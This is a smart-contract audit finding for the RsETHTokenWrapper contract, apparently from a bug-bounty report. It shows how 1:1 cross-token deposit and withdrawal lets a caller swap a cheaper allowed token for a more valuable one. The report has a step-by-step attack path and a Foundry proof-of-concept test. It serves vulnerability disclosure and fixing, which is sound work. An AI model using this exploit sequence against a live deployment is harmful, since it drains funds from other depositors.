### Title
Cross-Token Withdrawal Allows Draining Higher-Value Allowed Token — (`contracts/L2/RsETHTokenWrapper.sol`)

---

### Summary

`RsETHTokenWrapper` mints wrsETH 1:1 for any allowed token deposited and burns wrsETH 1:1 to release any allowed token on withdrawal. There is no binding between the deposited token and the withdrawn token, and no rate/value check. When two allowed tokens with different market values coexist in the wrapper, an attacker can deposit the cheaper token and withdraw the more-valuable token, extracting the value difference at the expense of other depositors.

---

### Finding Description

`_deposit` mints wrsETH strictly 1:1 against the deposited token amount: [1](#0-0) 

`_withdraw` burns wrsETH strictly 1:1 and transfers whichever allowed token the caller specifies: [2](#0-1) 

The only guard in `_withdraw` is: [3](#0-2) 

There is no check that the caller deposited the same token, no exchange-rate comparison, and no oracle. wrsETH is fully fungible across all allowed tokens. Once `TIMELOCK_ROLE` adds a second token via `addAllowedToken`: [4](#0-3) 

the wrapper holds balances of both tokens and any holder of wrsETH can freely choose which allowed token to receive on withdrawal.

**Attack path:**

1. `TIMELOCK_ROLE` calls `addAllowedToken(altRsETH_B)` — a normal, intended protocol operation.
2. The wrapper accumulates a balance of `altRsETH_B` (e.g., via `depositBridgerAssets` or other depositors).
3. Attacker calls `deposit(altRsETH_A, N)` — mints `N` wrsETH against the cheaper token.
4. Attacker calls `withdraw(altRsETH_B, N)` — burns `N` wrsETH, receives `N` units of the more-valuable token.

If `altRsETH_B` is worth `P_B` ETH/unit and `altRsETH_A` is worth `P_A` ETH/unit with `P_B > P_A`, the attacker profits `N * (P_B - P_A)` ETH-equivalent at the expense of other depositors.

**Why the value difference is realistic:** rsETH is a yield-bearing token whose exchange rate against ETH increases over time. Different bridge implementations of rsETH on L2 may handle yield accrual differently — one may be a static-balance bridge token while another may be a rebasing or rate-accumulating token. Even a small divergence (e.g., 0.1% yield accrual) is immediately exploitable with no risk to the attacker.

---

### Impact Explanation

**High — Theft of unclaimed yield.** The attacker extracts the yield differential between two allowed tokens. The loss falls on other depositors whose collateral (the higher-value token) is drained. The wrapper's total ETH-value backing decreases, leaving remaining wrsETH holders under-collateralized.

---

### Likelihood Explanation

**Medium.** Preconditions are:
- `TIMELOCK_ROLE` must have added a second allowed token (a legitimate, expected protocol operation per the contract's design).
- The wrapper must hold a non-zero balance of the higher-value token.
- The two tokens must have diverged in value.

All three conditions are plausible in normal protocol operation. The attack requires no special role, no front-running, and no external protocol compromise — only a standard `deposit` + `withdraw` call sequence.

---

### Recommendation

1. **Track per-token balances vs. wrsETH supply separately.** Maintain a mapping `tokenDeposited[user]` or use a per-token share accounting model so withdrawals are bounded by what was deposited in that token.
2. **Alternatively, enforce a single canonical token.** If the intent is that all allowed tokens are always 1:1 equivalent, enforce this with an on-chain rate oracle check in `_withdraw` that reverts if the rate deviates beyond a tight bound (e.g., 0.1%).
3. **Restrict cross-token withdrawals.** Require that `withdraw(asset, amount)` can only be called with the same `asset` that was deposited, tracked per user or per wrsETH mint event.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {RsETHTokenWrapper} from "contracts/L2/RsETHTokenWrapper.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAltRsETH is ERC20 {
    constructor(string memory name) ERC20(name, name) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract CrossTokenWithdrawTest is Test {
    RsETHTokenWrapper wrapper;
    MockAltRsETH tokenA; // cheaper: 1 unit = 1.00 ETH
    MockAltRsETH tokenB; // more valuable: 1 unit = 1.01 ETH (1% yield accrued)

    address admin   = address(0xA);
    address bridger = address(0xB);
    address timelock = address(0xC);
    address attacker = address(0xD);
    address victim   = address(0xE);

    function setUp() public {
        tokenA = new MockAltRsETH("altRsETH_A");
        tokenB = new MockAltRsETH("altRsETH_B");

        wrapper = new RsETHTokenWrapper();
        // initialize with tokenA as the first allowed token
        wrapper.initialize(admin, bridger, address(tokenA));

        // grant TIMELOCK_ROLE and add tokenB
        vm.startPrank(admin);
        wrapper.grantRole(wrapper.TIMELOCK_ROLE(), timelock);
        vm.stopPrank();

        vm.prank(timelock);
        wrapper.addAllowedToken(address(tokenB));

        // victim deposits tokenB (the higher-value token) into the wrapper
        tokenB.mint(victim, 100e18);
        vm.startPrank(victim);
        tokenB.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenB), 100e18);
        vm.stopPrank();

        // attacker holds tokenA (the cheaper token)
        tokenA.mint(attacker, 100e18);
    }

    function testCrossTokenYieldTheft() public {
        // Attacker deposits 100 tokenA, receives 100 wrsETH
        vm.startPrank(attacker);
        tokenA.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenA), 100e18);

        // Attacker withdraws 100 tokenB (the higher-value token)
        wrapper.withdraw(address(tokenB), 100e18);
        vm.stopPrank();

        // Attacker now holds 100 tokenB instead of 100 tokenA
        // At market rates: tokenB worth 1.01 ETH/unit vs tokenA 1.00 ETH/unit
        // Profit = 100 * 0.01 = 1 ETH equivalent, stolen from victim's deposit
        assertEq(tokenB.balanceOf(attacker), 100e18);
        assertEq(tokenA.balanceOf(address(wrapper)), 100e18); // wrapper left with cheaper token
        // victim's wrsETH is now backed only by tokenA, not the tokenB they deposited
    }
}
```

The test demonstrates the complete attack with no privileged access — only standard `deposit` and `withdraw` calls on unmodified production code.

### Citations

**File:** contracts/L2/RsETHTokenWrapper.sol (L120-128)
```text
    function _withdraw(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        _burn(msg.sender, _amount);

        ERC20Upgradeable(_asset).safeTransfer(_to, _amount);

        emit Withdraw(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L134-141)
```text
    function _deposit(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);

        _mint(_to, _amount);
        emit Deposit(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L174-176)
```text
    function addAllowedToken(address _asset) external onlyRole(TIMELOCK_ROLE) {
        _addAllowedToken(_asset);
    }
```
